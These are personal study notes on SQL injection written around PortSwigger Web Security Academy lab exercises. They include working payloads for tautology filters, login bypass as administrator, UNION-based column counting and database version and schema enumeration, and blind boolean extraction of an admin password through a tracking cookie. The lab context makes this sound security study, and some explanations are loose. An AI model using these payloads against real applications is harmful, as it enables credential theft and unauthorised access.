Sql injection attacks;
  - it's an attack that attacker used to extract data of users inside the program and compromise the servers or the backend of the program 
  - it may be done using denial of service attack
  - as I said above it's impact as you know;
    - extract the data of the users like; passwords,credit cards...
how to detect sql injection
as you know  ; you need to test the software to see whehter it has a weaknesses or not
there are some tests you can submit into the application to see;  
  1. single quote '  and look for error
  2. some sql commands 
  3. boolean conditions like; OR 1=1 ..
Most cases that SQL  injections accours are;
1. in where statements
2. select statements
3. insert statements
4. Update statements


now we used SQL injection to extract; hidden data from the website
ex;
https://insecure-website.com/products?category=Gifts'--  -> here we added '-- 
-- -> is a comment in sql which means the restrication after that query make it comment and run this query instead 

this is the query behine the scene;
SELECT * FROM products
WHERE category = 'Gifts'--'
AND released = 1;
after you implement this query it will appear as you see;
SELECT * FROM products
WHERE category = 'Gifts'
no released restrication
ex'
https://insecure-website.com/products?category=Gifts' OR 1=1--

1=1 => true -> which means  choose any items from the table called products either it's categpry called Gifts or any one(true)
the query behined the scene;
SELECT * FROM products
WHERE category = 'Gifts'
OR 1=1--'
AND released = 1; 

category = 'Gifts'
OR
1 = 1
for the first lab ; 
the problem ;
 This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products



here are the solution;
https://0a3a00f5049a1016809fdfd600b000fd.web-security-academy.net/filter?category=Gifts%27+or+1=1--
I added '+or+1=1+-- 
this is the next test that you can add to make a sql injection into the lab 
note that ; '-- didn't show the whole items in the database so we used the other condition

----
2.Subverting application logic

by using query like this ; SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
you will notice that ; '--' => this comments will neglect all of what coming after it.
and just get the username with that name 
the solution of the lab on this;
 This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. 

the solution;
fill in the name with; administrator'--
then password with any num; 1233 
then click enter it will attack this website forward
---
Retrieving data from other tables:
  first you need to understand how union works in database;
SELECT City, Country FROM Customers
UNION
SELECT City, Country FROM Suppliers
ORDER BY City;
union remove all duplicates between rows + return compining data but without any duplication combine data vertically
return the same number of columns -> the tables to be compared have the same number of cclumns
+compatiple data types
This is called; SQL injection Union attack:
lab;
 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. 

the soulution will be by adding this ; 'UNION SELECT NULL,NULL,NULL--    -> so the number of the tables are 3 as NULL is accepted 3 times and it's represent any datatype for our program to be matched with the opposite comparing of UNIION

to the response of the page .
notes; why adding  ' before writing injection 
      -> as we need to escape the string that program tried to cover it on our script so we escape this but if the program accept number so we don't need to add ' 
like;
if program need ; username='administrator' you passed to it ;  UNION SELECT NULL,NULL-- -> it will wrap around it a '' so it will be string so it's now can't be read by the database to work on

also we add -- to escape the trailing of the program 

---
# Blind SQL injection volunerabilities;
  - in this sql injection -> we ask database some questions yes,no => 
  - we extract data by asking database tons of questions
  - you may ask it like that ;
    select id  from users where id='1234444455...' 
      if the id exists -> database says ; like welcome to the website or whatever

now steps to do this attack;
  - select id from users where id='1233...' and  '1'='1';
    once the system says  somthing or open the website for you -> this means we can ask database any question
      is the admin pass start with a ...

  - you ask about the first character of the pass of the admin ;
    select id , substring(select pass from users where username='Admin',1,1)='a 
   from users and '1'='1'
      we need to extract the pass of admin character by other untill know it 
      if website open it's gate this means => a is correct else not try again 
      substring(string,1,1)=>1 -> the first character of the pass you ask for 
- also you may ask by ; is letter > "m" ?

so now ; what we will do ;
  - take the cookie of the you -> inject with it a statement like this 
select id from users where id=your cookie' and ' 1 '=' 1';
so to know the password of the user called administrator; we use blind sqlinjection attack
like this ;xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
if return true -> that means first char > m 
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
if return false -> first character -> not >t
so it's located from m to t
now 
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
if yes -> we know the first character is s 
repeat the process on all the coming characters.

lab ; 

 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.
Hint

You can assume that the password only contains lowercase, alphanumeric characters.

analysis;
  - blind sql injection 
  - cookie for user
  - if query false -> no error appears , if yes -> pages says welcome back
  - database contain table=user
    - columns -> username,password
  - use blind sql to exploit and extract user password
  - log in as an administrator 
  - assume pass -> contain lowecase+alphanumeric chars.ddd
      go into repeater apply all of these payloads to see ;
      first ; make sure that there's a tables into the database so we use this ;
      TrackingId=edylXePlN1HEH7R9'and  (SELECT 'a' FROM users LIMIT 1)='a'--
      second make sure there is a column called + number of it's rows > 0 ; username 
      Cookie: TrackingId=edylXePlN1HEH7R9'and (SELECT count(*) from users where username='administrator')>0--
      now we want to inject our payload into the intruder to know the password;we know knows that 
      there's a table called; users+columns called; username,password we need to know the password
      so create a brute force attack to know the password;
        we need to know the password of the user first; 
          so we use this  attack ;
            TrackingId=edylXePlN1HEH7R9' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > §1§-- see whether the password bigger than the payload or not payload we change from 1;50 or whatever 
            fromhere we found that ; length of password =19 characters 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c1e1f513-4002-4ea4-b3d4-846c367eb2d5" />



      we will use this :
       ' and  SUBSTRING((SELECT password FROM users WHERE username='administrator'),§1§,1)='§a§'--
 and set the first payload as number,second as bruteforce use the type of the attack ; cluster bomb as it works with two payloads
 
    now let's build our attack 
after 2 hours -> the password is   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19
                                   s6c3nlsx945pip8jgz0
didn't open on my  lab as it takes many hours so maybe the streaming of application stop and the password change from the insside but I underdstand the concept


-------------------------
now let's see : second order sql injection;
  - you store your data legally then use this data to extract other users in the database
  - how to do this;
      insert into users  (user,pass) values ('nona','1234')
      then;
    SELECT * FROM users WHERE username = 'admin'--' now this return all users called admin whatever their password is.

    ----
    after you inject database now you can extract info about it like; version,list the tables of it.
    SELECT @@version  (to know mysql db)  or you can ; ' UNION SELECT @@version--  
    SELECT * FROM information_schema.tables
lab;
 This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.
Hint

On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual 

  analysis;
  - focus on product category filter
  - use Union attack to retrive result
  - solution= database version stirng

solution I clicked on buttons of category filter + then open that http in the repeater then run this query;
  ?category=Clothing%2c+shoes+and+accessories +(select Null,Null from dual)-- HTTP/2  it return 200 ok that means this table dual contain two columns now how to extract version of database;
  hit this instead of old query ;
?category=Clothing%2c+shoes+and+accessories' UNION SELECT BANNER ,NULL FROM V$VERSION--
note; Banner is a special column inside oracle that contain the version number + data about it.
output;
  CORE	11.2.0.2.0	Production

outputs;
  - once you knew the type of database+any table inside it => you started to wispeir around it by extracting it's version and soon.

--
lab;
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 
 analysis;
  - focus on product category filter
  - this lab used with mysql database
  - use Union attack to retrive result
  - solution= database version stirng
solution;
?category=Food+%26+Drink'+Union+select +@@version,+Null# HTTP/2
I added from Union untill Http.
note that  we use # as comment in database
    - @@version -> is a variable that used to return the version of the database.
output;
8.0.42-0ubuntu0.20.04.1
----
now we need to extract the table columns + table name so we use something called; information_schema which tells us about the information of the table
  - most database except oracle uses this;
    - to return the name of the tables inside this database;SELECT * FROM information_schema.tables
    - ex;SELECT * FROM information_schema.columns WHERE table_name = 'Users' this return info about table
   
      

lab;
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.
Hint

You can find some useful payloads on our SQL injection cheat sheet(https://portswigger.net/web-security/sql-injection/cheat-sheet)
analysis;
  - sql injection in product filter
  - use UNION attack to retrieve data from other tables
  - table contain; usernames,passwords
  - determine the name of the table+ columns it contain->content of the tables (username,passwords)
  - log as administrator
  - non oracle database

solution;
  determine the type of database we use  ;
    - +Union+select+version(),+Null--     
    output;
    PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
    - we know this is postgresql + contain a table but we didn't know it's name but it's contents are password,username
      ' UNION SELECT table_name,NULL FROM information_schema.tables--

